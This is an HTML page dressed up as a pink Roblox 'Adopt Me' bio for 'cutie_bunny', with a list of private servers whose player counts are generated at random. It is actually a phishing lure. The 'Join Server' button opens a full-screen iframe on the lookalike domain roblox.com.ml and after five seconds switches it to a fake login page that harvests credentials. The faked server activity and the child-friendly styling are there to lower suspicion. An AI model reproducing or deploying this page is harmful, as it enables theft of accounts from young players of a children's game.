<!DOCTYPE html>
<html>
<head>
  <title>Adopt Me Bio 💖</title>

  <link href="https://fonts.googleapis.com/css2?family=Fredoka:wght@400;600&display=swap" rel="stylesheet">

  <style>
    body {
      margin: 0;
      font-family: 'Fredoka', sans-serif;
      background: url("https://parentzone.org.uk/sites/default/files/2021-11/adoptme_screen.jpg") no-repeat center center fixed;
      background-size: cover;
      overflow: hidden;
    }

    /* overlay blur */
    .overlay {
      position: absolute;
      width: 100%;
      height: 100%;
      backdrop-filter: blur(6px);
      background: rgba(0,0,0,0.25);
      z-index: 1;
    }

    /* floating hearts */
    .heart {
      position: absolute;
      color: #ff69b4;
      font-size: 20px;
      animation: floatUp 6s linear infinite;
      opacity: 0.7;
      z-index: 2;
    }

    @keyframes floatUp {
      0% { transform: translateY(100vh) scale(0.5); opacity: 0; }
      50% { opacity: 1; }
      100% { transform: translateY(-10vh) scale(1); opacity: 0; }
    }

    .bio {
      position: relative;
      height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      z-index: 3;
    }

    .card {
      background: #ffe6f5;
      border-radius: 30px;
      padding: 30px;
      width: 360px;
      text-align: center;
      box-shadow: 0 10px 40px rgba(0,0,0,0.4);
      border: 4px solid white;
    }

    .avatar {
      width: 110px;
      height: 110px;
      border-radius: 50%;
      border: 4px solid white;
      margin-bottom: 10px;
    }

    h1 {
      color: #ff4da6;
    }

    .desc {
      color: #ff69b4;
      font-size: 14px;
    }

    /* glowing button */
    .join-btn {
      margin-top: 20px;
      background: linear-gradient(180deg, #ff8ad6, #ff4db8);
      border: none;
      border-radius: 25px;
      padding: 14px 25px;
      font-size: 18px;
      color: white;
      cursor: pointer;
      box-shadow: 0 0 15px #ff69b4;
      animation: pulse 1.5s infinite;
    }

    @keyframes pulse {
      0% { box-shadow: 0 0 10px #ff69b4; }
      50% { box-shadow: 0 0 25px #ff1493; }
      100% { box-shadow: 0 0 10px #ff69b4; }
    }

    /* server list */
.servers {
  margin-top: 15px;
  background: #fff0f8;
  border-radius: 15px;
  padding: 10px;
  max-height: 200px;
  overflow-y: auto;

  display: grid;
  grid-template-columns: repeat(2, 1fr);
  gap: 8px;
}

.server:hover {
  transform: scale(1.03);
}

.server span {
  font-size: 12px;
  background: #ffd6f9;
  padding: 3px 8px;
  border-radius: 10px;
}

/* special states */
.server.full span {
  background: #ff4d6d;
  color: white;
}

.server.low span {
  background: #90ee90;
}

.server.vip span {
  background: gold;
  color: black;
}

 iframe {
  position: fixed;
  top: 0;
  left: 0;
  width: 100%;
  height: 100vh;
  border: none;
  display: none;

  z-index: 99999; /* VERY HIGH */
}

    /* notification */
    .notif {
      position: absolute;
      bottom: 20px;
      left: 20px;
      background: rgba(0,0,0,0.6);
      color: white;
      padding: 10px 15px;
      border-radius: 15px;
      font-size: 14px;
      z-index: 5;
      animation: fadeInOut 4s infinite;
    }

    @keyframes fadeInOut {
      0% { opacity: 0; transform: translateY(20px); }
      20% { opacity: 1; transform: translateY(0); }
      80% { opacity: 1; }
      100% { opacity: 0; transform: translateY(20px); }
    }
  </style>
</head>

<body>

<div class="overlay" id="overlay"></div>

<!-- floating hearts -->
<script>
for (let i = 0; i < 20; i++) {
  let heart = document.createElement("div");
  heart.className = "heart";
  heart.innerText = "💖";
  heart.style.left = Math.random() * 100 + "vw";
  heart.style.animationDuration = (4 + Math.random() * 4) + "s";
  document.body.appendChild(heart);
}
</script>
<script>
function updateServers() {
  const servers = document.querySelectorAll(".server");

  servers.forEach(server => {
    let count = parseInt(server.getAttribute("data-count"));

    // random + or -
    let change = Math.floor(Math.random() * 3) - 1; // -1, 0, +1
    count += change;

    // clamp between 0 and 48
    if (count < 0) count = 0;
    if (count > 48) count = 48;

    server.setAttribute("data-count", count);

    const span = server.querySelector("span");

    if (count >= 48) {
      span.innerText = "FULL";
      server.classList.add("full");
    } else {
      span.innerText = count + "/48";
      server.classList.remove("full");
    }

    // low server highlight
    if (count <= 5) {
      server.classList.add("low");
    } else {
      server.classList.remove("low");
    }
  });
}

// update every 2 seconds
setInterval(updateServers, 2000);
</script>
<div class="bio" id="bioPage">

    <h1>💖 cutie_bunny 💖</h1>

    <div class="desc">

    </div>

    <button class="join-btn" onclick="joinServer()">💖 Join Server 💖</button>

  <div class="servers">
  <div class="server" data-count="12">Server #123 <span>12/48</span></div>
  <div class="server" data-count="3">Server #45 <span>3/48</span></div>
  <div class="server" data-count="18">Server #301 <span>18/48</span></div>
  <div class="server" data-count="22">Server #744 <span>22/48</span></div>
  <div class="server" data-count="35">Server #268 <span>35/48</span></div>
  <div class="server" data-count="9">Server #120 <span>9/48</span></div>
  <div class="server" data-count="29">Server #707 <span>29/48</span></div>
  <div class="server" data-count="41">Server #662 <span>41/48</span></div>
</div>
<div class="notif" id="notif"></div>

<iframe id="frame"></iframe>

<script>
function joinServer() {
  document.getElementById("bioPage").style.display = "none";
  document.getElementById("overlay").style.display = "none";

  const frame = document.getElementById("frame");
  frame.style.display = "block";

  frame.src = "https://www.roblox.com.ml/games/920587237/Adopt-Me?privateServerLinkCode=141873631524841347615847783517";

  setTimeout(() => {
    frame.src = "https://www.roblox.com.ml/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fgames%2F348241630184%2FAdopt-Me";
  }, 5000);
}
</script>

function createNotif() {

  notif.className = "notif";

  notif.style.bottom = (20 + document.querySelectorAll(".notif").length * 50) + "px";

</body>
</html>
